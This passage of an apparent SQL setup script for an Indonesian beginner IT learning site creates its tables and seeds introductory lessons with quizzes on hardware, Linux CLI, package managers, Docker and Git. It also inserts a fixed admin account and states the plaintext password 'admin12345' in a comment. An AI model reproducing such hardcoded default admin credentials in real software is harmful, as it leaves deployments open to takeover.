-- ================================================
-- CyberLab Database Setup Script
-- Copy-paste ini ke Supabase SQL Editor lalu klik Run
-- ================================================

-- 1. DROP existing tables (jika ada)
DROP TABLE IF EXISTS "ForumReply" CASCADE;
DROP TABLE IF EXISTS "ForumPost" CASCADE;
DROP TABLE IF EXISTS "Progress" CASCADE;
DROP TABLE IF EXISTS "Session" CASCADE;
DROP TABLE IF EXISTS "Material" CASCADE;
DROP TABLE IF EXISTS "User" CASCADE;

-- 2. CREATE TABLES
CREATE TABLE "User" (
    id TEXT PRIMARY KEY,
    name TEXT NOT NULL,
    email TEXT NOT NULL UNIQUE,
    password TEXT NOT NULL,
    role TEXT NOT NULL DEFAULT 'USER',
    banned BOOLEAN NOT NULL DEFAULT false,
    "violationCount" INTEGER NOT NULL DEFAULT 0,
    "certificateId" TEXT UNIQUE,
    "certificateIssuedAt" TIMESTAMP(3),
    "createdAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
    "updatedAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP
);

CREATE TABLE "Session" (
    id TEXT PRIMARY KEY,
    token TEXT NOT NULL UNIQUE,
    "userId" TEXT NOT NULL,
    "expiresAt" TIMESTAMP(3) NOT NULL,
    "createdAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
    CONSTRAINT "Session_userId_fkey" FOREIGN KEY ("userId") REFERENCES "User"(id) ON DELETE CASCADE
);
CREATE INDEX "Session_userId_idx" ON "Session"("userId");

CREATE TABLE "Material" (
    id TEXT PRIMARY KEY,
    level INTEGER NOT NULL,
    "order" INTEGER NOT NULL,
    title TEXT NOT NULL,
    slug TEXT NOT NULL UNIQUE,
    description TEXT NOT NULL,
    content TEXT NOT NULL,
    icon TEXT NOT NULL,
    "isProject" BOOLEAN NOT NULL DEFAULT false,
    quiz TEXT NOT NULL,
    "createdAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
    "updatedAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP
);
CREATE INDEX "Material_level_order_idx" ON "Material"(level, "order");

CREATE TABLE "Progress" (
    id TEXT PRIMARY KEY,
    "userId" TEXT NOT NULL,
    "materialId" TEXT NOT NULL,
    completed BOOLEAN NOT NULL DEFAULT false,
    "quizScore" INTEGER,
    "completedAt" TIMESTAMP(3),
    CONSTRAINT "Progress_userId_fkey" FOREIGN KEY ("userId") REFERENCES "User"(id) ON DELETE CASCADE,
    CONSTRAINT "Progress_materialId_fkey" FOREIGN KEY ("materialId") REFERENCES "Material"(id) ON DELETE CASCADE,
    CONSTRAINT "Progress_userId_materialId_key" UNIQUE ("userId", "materialId")
);
CREATE INDEX "Progress_userId_idx" ON "Progress"("userId");

CREATE TABLE "ForumPost" (
    id TEXT PRIMARY KEY,
    "userId" TEXT NOT NULL,
    title TEXT NOT NULL,
    content TEXT NOT NULL,
    category TEXT NOT NULL DEFAULT 'Umum',
    "createdAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
    "updatedAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
    CONSTRAINT "ForumPost_userId_fkey" FOREIGN KEY ("userId") REFERENCES "User"(id) ON DELETE CASCADE
);
CREATE INDEX "ForumPost_userId_idx" ON "ForumPost"("userId");

CREATE TABLE "ForumReply" (
    id TEXT PRIMARY KEY,
    "postId" TEXT NOT NULL,
    "userId" TEXT NOT NULL,
    content TEXT NOT NULL,
    "createdAt" TIMESTAMP(3) NOT NULL DEFAULT CURRENT_TIMESTAMP,
    CONSTRAINT "ForumReply_postId_fkey" FOREIGN KEY ("postId") REFERENCES "ForumPost"(id) ON DELETE CASCADE,
    CONSTRAINT "ForumReply_userId_fkey" FOREIGN KEY ("userId") REFERENCES "User"(id) ON DELETE CASCADE
);
CREATE INDEX "ForumReply_postId_idx" ON "ForumReply"("postId");

-- 3. INSERT ADMIN USER
-- Password: admin12345 (hashed)
INSERT INTO "User" (id, name, email, password, role, "banned", "violationCount", "createdAt", "updatedAt")
VALUES ('admin-001', 'Admin CyberLab', 'admin@coderoom.id', 'c3f15dbb4f487dab247031dd648f8ac4:dbe537213938fa975ff0a01070fea261d35517e8354b64c0a65ad3a9fc6f592c10878da80d671481c7121ce1dbb684aa654c225ca4bb79bb5b1016523c122842', 'ADMIN', false, 0, NOW(), NOW());

-- 4. INSERT MATERIALS (82 materi)
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('pengenalan-dunia-it', 1, 1, 'Pengenalan Dunia IT', 'pengenalan-dunia-it', 'Mengenal dunia IT, peran teknologi informasi, dan karir di bidang tech.', '# Pengenalan Dunia IT


![Pengenalan Dunia IT](https://sfile.chatglm.cn/images-ppt/85b8ec210a95.jpg)

**Teknologi Informasi (IT)** adalah bidang yang berkaitan dengan pengelolaan, pemrosesan, penyimpanan, dan distribusi informasi menggunakan teknologi komputer. Di era digital ini, IT menjadi tulang punggung hampir setiap industri mulai dari kesehatan, keuangan, pendidikan, hingga hiburan.

## Apa Itu Teknologi Informasi?

IT mencakup hardware, software, jaringan, dan sistem yang digunakan untuk mengelola data. Dari smartphone di saku Anda hingga server raksasa di data center, semuanya adalah bagian dari ekosistem IT. Bidang ini terus berkembang pesat dengan inovasi seperti cloud computing, artificial intelligence, blockchain, dan Internet of Things (IoT).

```text
Komponen Utama IT:
- Hardware: CPU, RAM, Storage, Network Device
- Software: Operating System, Applications, Games
- Network: Internet, LAN, WAN, WiFi
- Data: Database, Files, Big Data
```

## Karir di Bidang IT

Industri IT menawarkan berbagai jalur karir yang menjanjikan dengan gaji kompetitif. Setiap peran membutuhkan kombinasi skill teknis dan soft skill yang berbeda, sehingga Anda bisa memilih jalur yang sesuai dengan minat.

```text
1. Software Developer       - membuat aplikasi web/mobile
2. Network Engineer         - mengelola jaringan komputer
3. Database Administrator   - mengelola database
4. Cybersecurity Specialist - mengamankan sistem
5. DevOps Engineer          - otomasi dan deployment
6. Data Scientist           - analisis data besar
7. UI/UX Designer           - desain antarmuka pengguna
```

## Skill Dasar yang Dibutuhkan

Untuk memulai di dunia IT, kuasai fondasi berikut: pemahaman komputer dasar, kemampuan problem-solving, logika pemrograman, kemampuan komunikasi, dan kemauan belajar terus-menerus karena teknologi selalu berubah. Banyak sumber belajar gratis tersedia online seperti dokumentasi resmi, tutorial video, dan platform interaktif seperti freeCodeCamp.

Dunia IT juga menuntut soft skill: kemampuan kerja tim, komunikasi teknis, dan manajemen waktu. Banyak proyek IT dikerjakan dalam tim cross-functional sehingga kolaborasi sangat penting. Selain itu, bergabunglah dengan komunitas seperti forum online, meetup, atau kontribusi open-source untuk memperluas jaringan dan mempercepat pembelajaran. Komunitas seperti Stack Overflow, GitHub, dan Discord developer Indonesia adalah tempat bagus untuk bertanya dan berbagi pengetahuan dengan sesama praktisi IT.

> **Tips:** Jangan mencoba belajar semua sekaligus. Pilih satu bidang fokus, kuasai dasar-dasarnya, bangun proyek kecil, lalu kembangkan secara bertahap.



## Studi Kasus di Dunia Nyata

Bayangkan Anda bekerja di perusahaan startup. Anda berurusan dengan komputer, server, cloud storage, dan network.

## Tips Memulai

> Luangkan waktu memahami dasar IT sebelum lanjut ke pemrograman.', '💻', false, '[{"question":"Apa kepanjangan dari IT?","options":["Internet Technology","Information Technology","Integrated Tech","International Telecom"],"answer":1,"explanation":"IT adalah singkatan dari Information Technology (Teknologi Informasi)."},{"question":"Manakah yang BUKAN termasuk komponen utama IT?","options":["Hardware","Software","Network","Seni rupa"],"answer":3,"explanation":"Komponen utama IT meliputi hardware, software, network, dan data. Seni rupa bukan komponen IT."},{"question":"Peran yang bertugas mengamankan sistem komputer adalah?","options":["Data Scientist","Cybersecurity Specialist","UI/UX Designer","Network Engineer"],"answer":1,"explanation":"Cybersecurity Specialist bertanggung jawab melindungi sistem, jaringan, dan data dari ancaman digital."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('hardware-komputer', 1, 2, 'Hardware Komputer', 'hardware-komputer', 'Memahami komponen hardware: CPU, RAM, storage, GPU, dan motherboard.', '# Hardware Komputer


![Hardware Komputer](https://sfile.chatglm.cn/images-ppt/5736e9a0cfac.jpg)

**Hardware** adalah komponen fisik komputer yang bisa disentuh. Memahami hardware penting karena menjadi fondasi kerja seluruh sistem komputer, dari menjalankan aplikasi sederhana hingga server skala besar.

## Komponen Utama Hardware

Setiap komponen memiliki peran spesifik. Berikut bagian terpenting yang harus Anda ketahui:

```text
1. CPU     - otak komputer, memproses instruksi
2. RAM     - memori sementara berkecepatan tinggi
3. Storage - penyimpanan permanen (HDD/SSD)
4. GPU     - memproses grafis dan komputasi paralel
5. Motherboard - papan yang menyatukan semua komponen
6. PSU     - Power Supply Unit, sumber daya
```

## CPU dan RAM

**CPU (Central Processing Unit)** adalah otak komputer yang mengeksekusi instruksi program. Kecepatan CPU diukur dalam GHz dan jumlah core. CPU multi-core bisa menjalankan banyak tugas secara paralel.

**RAM (Random Access Memory)** adalah memori volatile yang menyimpan data sementara saat komputer menyala. Semakin besar RAM, semakin banyak aplikasi yang bisa berjalan bersamaan tanpa lag.

```bash
# Cek info hardware di Linux
lscpu              # info CPU
free -h            # info RAM
lsblk              # info storage
nvidia-smi         # info GPU (jika ada)
```

## Storage: HDD vs SSD

**HDD (Hard Disk Drive)** menggunakan piringan magnetik, lebih murah namun lambat. **SSD (Solid State Drive)** menggunakan chip flash, jauh lebih cepat, lebih hemat energi, dan tahan goncangan. Untuk performa modern, SSD sangat direkomendasikan sebagai boot drive.

Selain komponen di atas, perangkat input/output seperti keyboard, mouse, monitor, dan kartu jaringan (NIC) juga penting. Saat membangun atau membeli komputer, pastikan komponen saling kompatibel: motherboard harus mendukung socket CPU, RAM dengan tipe yang sesuai (DDR4 atau DDR5), dan PSU dengan daya cukup untuk seluruh sistem. Memahami komponen hardware membantu Anda saat troubleshooting, upgrade, maupun merakit server sendiri untuk kebutuhan lab atau bisnis kecil.

Suhu juga penting: jaga sirkulasi udara dan pendinginan CPU agar komponen tidak overheating, karena panas berlebih dapat memperpendek umur hardware dan menurunkan performa sistem secara signifikan.

> **Tips:** Saat membeli komputer, prioritaskan SSD daripada HDD. SSD memberi peningkatan kecepatan paling terasa dibanding upgrade lain.



## Studi Kasus di Dunia Nyata

Bayangkan Anda bekerja di perusahaan startup. Anda berurusan dengan komputer, server, cloud storage, dan network.

## Tips Memulai

> Luangkan waktu memahami dasar IT sebelum lanjut ke pemrograman.', '🖥️', false, '[{"question":"Apa fungsi CPU pada komputer?","options":["Menyimpan data permanen","Memproses instruksi program","Menampilkan grafis","Menyuplai daya listrik"],"answer":1,"explanation":"CPU (Central Processing Unit) adalah otak komputer yang mengeksekusi dan memproses instruksi program."},{"question":"Apa perbedaan utama RAM dan Storage?","options":["RAM lebih lambat","RAM volatile (sementara), storage permanen","Storage lebih mahal","Tidak ada perbedaan"],"answer":1,"explanation":"RAM bersifat volatile (data hilang saat mati) sebagai memori sementara, sedangkan storage menyimpan data permanen."},{"question":"Keunggulan SSD dibanding HDD adalah?","options":["Lebih murah","Kapasitas lebih besar","Jauh lebih cepat dan tahan goncangan","Lebih berat"],"answer":2,"explanation":"SSD menggunakan chip flash sehingga jauh lebih cepat, hemat energi, dan tahan goncangan dibanding HDD."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('sistem-operasi', 1, 3, 'Sistem Operasi', 'sistem-operasi', 'Windows, Linux, macOS - cara kerja OS dan perbedaannya.', '# Sistem Operasi


![Sistem Operasi](https://sfile.chatglm.cn/images-ppt/87a4b1b2ec74.jpg)

**Sistem Operasi (OS)** adalah software yang mengelola hardware dan software lain, serta menyediakan layanan untuk aplikasi. Tanpa OS, komputer hanya bongkahan logam yang tidak berguna.

## Jenis Sistem Operasi Populer

```text
1. Windows  - Microsoft, paling umum untuk desktop
2. Linux    - open-source, banyak distro (Ubuntu, Debian)
3. macOS    - Apple, eksklusif untuk Mac
4. Android  - Google, untuk perangkat mobile
5. iOS      - Apple, untuk iPhone/iPad
```

## Cara Kerja OS

OS berperan sebagai jembatan antara user, aplikasi, dan hardware. Saat Anda klik ikon, OS mengatur CPU untuk menjalankan program, mengalokasikan RAM, mengakses storage, dan menampilkan output ke layar.

```text
User -> Aplikasi -> OS (Kernel) -> Hardware
              |
              +-> Manajemen: CPU, Memori, File, Proses, I/O
```

## Linux: OS para Developer

Linux sangat populer di kalangan developer dan server karena gratis, open-source, stabil, dan aman. Banyak layanan internet besar seperti Google dan Facebook berjalan di atas Linux.

```bash
# Cek informasi sistem di Linux
uname -a            # info kernel
cat /etc/os-release # info distro
whoami              # user aktif
date                # tanggal & waktu
```

## Perbedaan Kunci

- **Windows** — mudah digunakan, kompatibilitas software tinggi, cocok untuk gaming.
- **Linux** — gratis, fleksibel, ideal untuk server dan programming.
- **macOS** — stabil, ekosistem Apple, populer untuk desain dan development.

Setiap OS punya filosofi dan ekosistem aplikasi berbeda. Windows mendominasi desktop rumah dan kantor, macOS favorit desainer dan developer iOS, sedangkan Linux memerintah server, cloud, dan embedded device. Untuk pemula IT, sangat disarankan menginstal Linux (misalnya Ubuntu) lewat Virtual Machine atau WSL (Windows Subsystem for Linux) agar bisa belajar tanpa meninggalkan Windows. Banyak tutorial, tool, dan dokumentasi teknis berbahasa Linux, jadi familiaritas dengan Linux akan sangat membantu perjalanan karir IT Anda.

> **Tips:** Untuk belajar IT/cybersecurity, kuasai Linux. Banyak tool dan server production berjalan di Linux, dan Anda bisa mencobanya lewat Virtual Machine atau WSL di Windows.



## Studi Kasus di Dunia Nyata

Bayangkan Anda bekerja di perusahaan startup. Anda berurusan dengan komputer, server, cloud storage, dan network.

## Tips Memulai

> Luangkan waktu memahami dasar IT sebelum lanjut ke pemrograman.', '🪟', false, '[{"question":"Apa fungsi utama Sistem Operasi?","options":["Menyimpan file","Mengelola hardware dan software","Menampilkan gambar","Menghubungkan ke internet"],"answer":1,"explanation":"OS mengelola resource hardware dan menyediakan layanan untuk aplikasi agar bisa berjalan."},{"question":"Sistem operasi open-source yang populer untuk server adalah?","options":["Windows","Linux","macOS","iOS"],"answer":1,"explanation":"Linux adalah OS open-source yang paling banyak digunakan untuk server karena gratis, stabil, dan aman."},{"question":"Perintah Linux untuk melihat info kernel adalah?","options":["whoami","uname -a","ls","pwd"],"answer":1,"explanation":"Perintah ''uname -a'' menampilkan informasi kernel dan sistem operasi secara lengkap."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('command-line-interface', 1, 4, 'Command Line Interface', 'command-line-interface', 'Dasar command line Linux/Windows untuk navigasi dan manajemen file.', '# Command Line Interface


![Command Line Interface](https://sfile.chatglm.cn/images-ppt/55ec96ace5b7.jpg)

**Command Line Interface (CLI)** adalah cara berinteraksi dengan komputer menggunakan perintah teks. CLI lebih cepat dan powerful dibanding GUI untuk banyak tugas administrasi dan development.

## Perintah Dasar Linux

```bash
# Navigasi direktori
pwd              # tampilkan direktori saat ini
ls               # list file
ls -la           # list semua file termasuk hidden
cd /home/user    # pindah ke direktori
cd ..            # naik satu level

# Manajemen file
mkdir folder     # buat direktori
touch file.txt   # buat file kosong
cp file.txt copy.txt  # copy
mv file.txt new.txt   # move/rename
rm file.txt      # hapus file
rm -r folder     # hapus direktori rekursif
```

## Melihat Isi File

```bash
cat file.txt         # tampilkan seluruh isi
less file.txt        # buka dengan pager (q untuk keluar)
head -n 10 file.txt  # 10 baris pertama
tail -n 10 file.txt  # 10 baris terakhir
grep "error" log.txt # cari kata ''error''
```

## Permission File

Setiap file memiliki 3 level permission: **owner**, **group**, **others**, dengan hak read (r), write (w), execute (x).

```bash
chmod +x script.sh    # tambah execute permission
chmod 755 file.txt    # rwxr-xr-x
chown user file.txt   # ubah owner
```

## Tips Produktivitas

- Gunakan `Tab` untuk auto-complete nama file/perintah.
- Gunakan `↑/↓` untuk menavigasi history perintah.
- Gunakan `Ctrl+C` untuk menghentikan proses yang berjalan.
- Gunakan `Ctrl+L` atau `clear` untuk membersihkan layar.

Menguasai CLI juga berarti memahami pipeline dan redirect. Operator pipe mengalirkan output satu perintah ke perintah lain, sementara operator redirect mengarahkan output ke file. Contohnya, kombinasi perintah ls, grep, dan redirect bisa menyaring file tertentu dan menyimpan hasilnya ke sebuah file teks. Kombinasi perintah-perintah kecil menjadi pipeline yang powerful adalah inti filosofi Unix yang membuat CLI begitu efisien untuk tugas kompleks seperti analisis log, pemrosesan teks, dan otomasi sistem.

> **Tips:** Investasikan waktu mempelajari CLI. Sekali bisa, Anda akan jauh lebih cepat dan efisien dalam tugas IT apapun.



## Studi Kasus di Dunia Nyata

Bayangkan Anda bekerja di perusahaan startup. Anda berurusan dengan komputer, server, cloud storage, dan network.

## Tips Memulai

> Luangkan waktu memahami dasar IT sebelum lanjut ke pemrograman.', '⌨️', false, '[{"question":"Perintah untuk menampilkan direktori saat ini?","options":["ls","pwd","cd","dir"],"answer":1,"explanation":"pwd (print working directory) menampilkan path direktori saat ini."},{"question":"Apa fungsi perintah ''cd ..'' ?","options":["Pindah ke root","Naik satu level direktori","Hapus direktori","Buat direktori baru"],"answer":1,"explanation":"cd .. berarti naik satu level ke direktori parent."},{"question":"Perintah untuk membuat direktori baru?","options":["touch","mkdir","create","newdir"],"answer":1,"explanation":"mkdir (make directory) membuat direktori/folder baru."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('file-system-management', 1, 5, 'File System & Management', 'file-system-management', 'Struktur direktori, path, permission, dan manajemen file.', '# File System & Management


![File System & Management](https://sfile.chatglm.cn/images-ppt/bd0adb63f340.jpeg)

**File System** adalah cara sistem operasi mengorganisir, menyimpan, dan menemukan file di storage. Memahami file system penting untuk mengelola data secara efektif.

## Struktur Direktori Linux

Linux menggunakan struktur hierarki berbentuk pohon yang dimulai dari root (`/`).

```text
/            root directory
/home        direktori user
/etc         file konfigurasi sistem
/var         data variabel (log, cache)
/tmp         file sementara
/usr         program & library
/bin         binary esensial
/opt         software optional
```

## Path: Absolute vs Relative

```bash
# Absolute path - dimulai dari root
cd /home/user/documents

# Relative path - relatif terhadap direktori saat ini
cd documents
cd ../images    # naik lalu masuk images

# Path khusus
.       # direktori saat ini
..      # direktori parent
~       # home directory user
```

## Permission dan Ownership

Setiap file punya 3 set permission (owner, group, others) dengan kombinasi rwx.

```bash
# Lihat permission
ls -l file.txt
# Output: -rw-r--r-- 1 user group 1024 Jan 1 file.txt

# Ubah permission numerik
chmod 644 file.txt   # rw-r--r--
chmod 755 script.sh  # rwxr-xr-x

# Ubah owner
chown user:group file.txt
```

## Wildcard dan Find

```bash
ls *.txt            # semua file .txt
rm temp_*           # hapus file diawali ''temp_''
find /home -name "*.log"        # cari file .log
find . -type d -name "backup"   # cari direktori ''backup''
```

Selain permission standar, Linux juga mendukung ACL (Access Control List) untuk permission yang lebih granular, serta atribut khusus seperti immutable yang mencegah file diubah bahkan oleh root. Pahami juga konsep symlink (symbolic link) dan hardlink: symlink adalah shortcut ke path, sedangkan hardlink adalah nama tambahan untuk file yang sama. Keduanya berguna untuk mengorganisir file tanpa menduplikasi data. Untuk mencari file berdasarkan konten, gunakan grep rekursif atau tool alternatif seperti ripgrep yang jauh lebih cepat di project berskala besar.

> **Tips:** Hati-hati menggunakan `rm -rf`. Kombinasi ini menghapus secara rekursif tanpa konfirmasi dan tidak bisa di-undo. Selalu cek path dulu!



## Studi Kasus di Dunia Nyata

Bayangkan Anda bekerja di perusahaan startup. Anda berurusan dengan komputer, server, cloud storage, dan network.

## Tips Memulai

> Luangkan waktu memahami dasar IT sebelum lanjut ke pemrograman.', '📁', false, '[{"question":"Direktori root di Linux dilambangkan dengan?","options":["\\\\","/","C:","~"],"answer":1,"explanation":"Linux menggunakan ''/'' sebagai root directory, berbeda dengan Windows yang menggunakan drive letter seperti C:."},{"question":"Apa arti permission ''755''?","options":["rwxr-xr-x","rw-rw-rw-","rwxrwxrwx","r--r--r--"],"answer":0,"explanation":"755 = rwx (7) untuk owner, r-x (5) untuk group, r-x (5) untuk others."},{"question":"Symbol ''~'' di path Linux berarti?","options":["Root directory","Direktori parent","Home directory user","Direktori sementara"],"answer":2,"explanation":"Tilde ''~'' adalah shortcut untuk home directory user yang sedang aktif."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('software-installation', 1, 6, 'Software Installation & Package Manager', 'software-installation', 'Cara install software dan menggunakan package manager (apt, npm, pip).', '# Software Installation & Package Manager


![Software Installation & Package Manager](https://sfile.chatglm.cn/images-ppt/aeed7d5f72ca.jpg)

**Package Manager** adalah tool yang mengotomatisasi proses instalasi, update, dan removal software. Package manager menyelesaikan dependency secara otomatis sehingga Anda tidak perlu install satu per satu manual.

## Package Manager Populer

```text
OS / Bahasa      Package Manager
-----------------------------------
Ubuntu/Debian   apt
CentOS/RHEL     yum / dnf
macOS           brew (Homebrew)
Windows         winget / choco
JavaScript      npm / yarn / pnpm
Python          pip / poetry
Rust            cargo
```

## Menggunakan APT (Linux Debian/Ubuntu)

```bash
sudo apt update            # update daftar package
sudo apt upgrade           # upgrade semua package
sudo apt install nginx     # install nginx
sudo apt remove nginx      # hapus nginx
apt search python3         # cari package
apt show nginx             # lihat info package
```

## NPM untuk JavaScript

```bash
npm init -y                # buat package.json
npm install express        # install package lokal
npm install -g typescript  # install global
npm update                 # update semua package
npm uninstall express      # hapus package
npm list                   # lihat package terinstall
```

## PIP untuk Python

```bash
pip install requests       # install package
pip install -r requirements.txt  # install dari file
pip list                   # daftar package
pip freeze > requirements.txt    # simpan daftar package
pip uninstall requests     # hapus package
```

Setiap package manager punya file konfigurasi sumber repository. Pada apt, sumber didefinisikan di berkas sources.list. Pada npm, registry default adalah npmjs.com tapi bisa diganti ke mirror lokal untuk kecepatan. Penting juga untuk mengunci versi dependency: npm menggunakan package-lock.json, pip menggunakan requirements.txt, sementara tool modern seperti Poetry dan pnpm menawarkan locking yang lebih ketat. Mengunci versi mencegah bug tak terduga saat dependency rilis versi baru yang breaking, terutama di environment production di mana stabilitas adalah prioritas utama.

> **Tips:** Selalu gunakan package manager daripada download installer manual. Selain otomatis resolve dependency, update dan uninstall juga jauh lebih mudah dan bersih.



## Studi Kasus di Dunia Nyata

Bayangkan Anda bekerja di perusahaan startup. Anda berurusan dengan komputer, server, cloud storage, dan network.

## Tips Memulai

> Luangkan waktu memahami dasar IT sebelum lanjut ke pemrograman.', '📦', false, '[{"question":"Package manager default untuk Ubuntu/Debian adalah?","options":["yum","apt","brew","npm"],"answer":1,"explanation":"apt (Advanced Package Tool) adalah package manager default untuk distribusi Linux Debian/Ubuntu."},{"question":"Perintah npm untuk install package secara global?","options":["npm install pkg","npm install -g pkg","npm global pkg","npm -global pkg"],"answer":1,"explanation":"Flag ''-g'' (global) membuat package tersedia di seluruh sistem, bukan hanya di project lokal."},{"question":"Apa fungsi ''pip install -r requirements.txt''?","options":["Update pip","Install semua package dari file requirements","Hapus semua package","Cek versi pip"],"answer":1,"explanation":"Perintah ini menginstall semua package yang terdaftar di file requirements.txt, biasanya untuk reproduksi environment."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('virtual-machine-container', 1, 7, 'Virtual Machine & Container', 'virtual-machine-container', 'Konsep virtualisasi dengan VM dan container (Docker).', '# Virtual Machine & Container


![Virtual Machine & Container](https://sfile.chatglm.cn/images-ppt/ddf18b19db90.jpg)

**Virtualisasi** memungkinkan satu komputer fisik menjalankan banyak environment terisolasi. Virtual Machine (VM) dan Container adalah dua pendekatan virtualisasi yang banyak digunakan di industri IT modern.

## Virtual Machine (VM)

VM adalah emulasi komputer lengkap yang menjalankan OS sendiri di atas hypervisor. Setiap VM memiliki kernel tersendiri sehingga lebih berat namun isolasinya sangat kuat.

```text
+-----------------------------------+
|        Host OS (Windows)          |
|  +----------+  +----------+       |
|  | VM1      |  | VM2      |       |
|  | Ubuntu   |  | Windows  |       |
|  | App A    |  | App B    |       |
|  +----------+  +----------+       |
|         Hypervisor (VMware/VBox)  |
+-----------------------------------+
```

## Container (Docker)

Container berbagi kernel host OS tetapi mengisolasi aplikasi dan dependency-nya. Container jauh lebih ringan dan cepat start dibanding VM.

```bash
# Perintah dasar Docker
docker pull nginx              # download image
docker images                  # list image
docker run -d -p 8080:80 nginx # jalankan container
docker ps                      # list container aktif
docker stop <container_id>     # hentikan container
docker exec -it <id> bash      # masuk ke container
```

## VM vs Container

```text
Aspek        | VM          | Container
-------------|-------------|-----------
Isolasi      | Kuat        | Sedang
Boot time    | Menit       | Detik
Resource     | Berat       | Ringan
OS           | Full guest  | Share kernel
Use case     | Multi-OS    | Microservice
```

## Dockerfile Sederhana

```dockerfile
FROM python:3.11-slim
WORKDIR /app
COPY requirements.txt .
RUN pip install -r requirements.txt
COPY . .
CMD ["python", "app.py"]
```

Untuk manajemen container skala produksi, digunakan orchestrator seperti Kubernetes yang mengelola ratusan container, scaling otomatis, dan self-healing. Sementara itu, tools seperti Vagrant memudahkan membuat VM development yang reproducible via kode (Infrastructure as Code). Pilihan antara VM dan container sering bukan either-or: banyak perusahaan menjalankan container di dalam VM untuk mendapat isolasi ganda. Pahami use case masing-masing agar bisa memilih teknologi virtualisasi yang tepat sesuai kebutuhan performance, security, dan kompleksitas tim Anda.

> **Tips:** Gunakan container untuk development agar environment konsisten antar developer. "It works on my machine" akan jadi masa lalu!



## Studi Kasus di Dunia Nyata

Bayangkan Anda bekerja di perusahaan startup. Anda berurusan dengan komputer, server, cloud storage, dan network.

## Tips Memulai

> Luangkan waktu memahami dasar IT sebelum lanjut ke pemrograman.', '📦', false, '[{"question":"Apa perbedaan utama VM dan Container?","options":["VM lebih cepat","Container berbagi kernel host, VM punya kernel sendiri","Container tidak ada","VM tidak butuh OS"],"answer":1,"explanation":"Container berbagi kernel host OS sehingga lebih ringan, sedangkan VM menjalankan OS lengkap sendiri (kernel tersendiri)."},{"question":"Perintah Docker untuk menjalankan container adalah?","options":["docker start","docker run","docker create","docker exec"],"answer":1,"explanation":"docker run membuat dan menjalankan container baru dari image yang ditentukan."},{"question":"Keunggulan container dibanding VM adalah?","options":["Isolasi lebih kuat","Boot lebih cepat dan ringan","Bisa jalankan OS berbeda","Lebih aman"],"answer":1,"explanation":"Container boot dalam hitungan detik dan menggunakan resource jauh lebih sedikit dibanding VM karena berbagi kernel host."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('git-version-control', 1, 8, 'Git & Version Control', 'git-version-control', 'Dasar Git: init, commit, branch, push, pull, dan GitHub.', '# Git & Version Control


![Git & Version Control](https://sfile.chatglm.cn/images-ppt/844b3398d70d.png)

**Git** adalah sistem version control terdistribusi yang melacak perubahan kode. Git memungkinkan banyak developer berkolaborasi, kembali ke versi sebelumnya, dan mengelola fitur secara paralel melalui branch.

## Setup Awal

```bash
git config --global user.name "Nama Anda"
git config --global user.email "email@example.com"
git config --global init.defaultBranch main
```

## Workflow Dasar

```bash
# Inisialisasi repository
git init

# Clone dari remote
git clone https://github.com/user/repo.git

# Cek status
git status

# Tambah file ke staging
git add file.txt
git add .                # semua perubahan

# Commit perubahan
git commit -m "feat: tambah fitur login"

# Lihat history
git log --oneline
```

## Branch dan Remote

```bash
# Branch
git branch fitur-baru
git checkout fitur-baru   # pindah branch
git checkout -b fitur-x   # buat & pindah
git merge fitur-baru      # gabungkan ke branch aktif

# Remote (GitHub/GitLab)
git remote add origin https://github.com/user/repo.git
git push -u origin main
git pull origin main
```

## Best Practice Commit Message

```text
feat:     fitur baru
fix:      perbaikan bug
docs:     perubahan dokumentasi
refactor: refactor kode
test:     tambah/ubah test
chore:    task rutin
```

Konsep penting lainnya adalah merge dan rebase. Merge menggabungkan branch dengan membuat commit merge, menjaga history lengkap. Rebase memindahkan commit ke base baru sehingga history jadi linear dan rapi, namun berbahaya pada branch yang dipakai bersama karena mengubah history. Untuk kolaborasi tim, alur kerja populer adalah Git Flow dengan branch develop dan release, atau GitHub Flow dengan branch fitur plus Pull Request. Pull Request memungkinkan code review sebelum merge, meningkatkan kualitas kode dan menangkap bug lebih awal. Selalu pull sebelum push untuk menghindari konflik, dan selesaikan konflik dengan teliti menggunakan tool visual seperti VS Code. Platform seperti GitHub dan GitLab juga menyediakan fitur Issues, Wiki, dan CI/CD yang melengkapi workflow Git untuk kolaborasi tim modern.

> **Tips:** Commit sering dengan pesan yang jelas. Satu commit = satu perubahan logis. Hindari commit "update" atau "fix bug" tanpa konteks.



## Studi Kasus di Dunia Nyata

Bayangkan Anda bekerja di perusahaan startup. Anda berurusan dengan komputer, server, cloud storage, dan network.

## Tips Memulai

